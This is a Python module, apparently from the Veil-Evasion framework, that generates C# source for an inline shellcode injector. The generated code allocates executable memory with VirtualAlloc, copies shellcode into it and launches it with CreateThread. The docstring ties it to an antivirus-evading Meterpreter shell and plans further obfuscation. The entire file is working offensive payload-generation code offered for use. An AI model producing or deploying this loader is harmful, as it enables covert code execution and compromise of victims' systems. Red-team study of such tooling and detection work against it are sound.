"""

C# inline shellcode injector using the VirtualAlloc()/CreateThread() pattern.

Adapated from code from: http://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/


Module built by @the_grayhound

TODO: obfuscation!

"""

from modules.common import shellcode

class Stager:

    def __init__(self):
        # required
        self.shortname = "VirtualAlloc"
        self.description = "C# VirtualAlloc method for inline shellcode injection"
        self.rating = "Poor"
        self.language = "c#"
        self.extension = "cs"

        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}

        #self.notes = ("\n\tCompile with Visual Studio. To hide the console, set 'PROJECTNAME'/'Payload Properties'/'Output Type' to 'Windows Appliation'\n")

    def generate(self):

        Shellcode = self.shellcode.generate()
        Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])

        payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
        payloadCode += "namespace payload { class Program  { static void Main() {\n"
        payloadCode += "byte[] s = {"+Shellcode+"};"
        payloadCode += "UInt32 funcAddr = VirtualAlloc(0, (UInt32)s.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
        payloadCode += "Marshal.Copy(s, 0, (IntPtr)(funcAddr), s.Length);\n"
        payloadCode += "IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero;\n"
        payloadCode += "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n"
        payloadCode += "WaitForSingleObject(hThread, 0xFFFFFFFF);}\n"
        payloadCode += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(
  UInt32 lpThreadAttributes,
  UInt32 dwStackSize,
  UInt32 lpStartAddress,
  IntPtr param,
  UInt32 dwCreationFlags,
  ref UInt32 lpThreadId);
[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } }\n"""

        return payloadCode
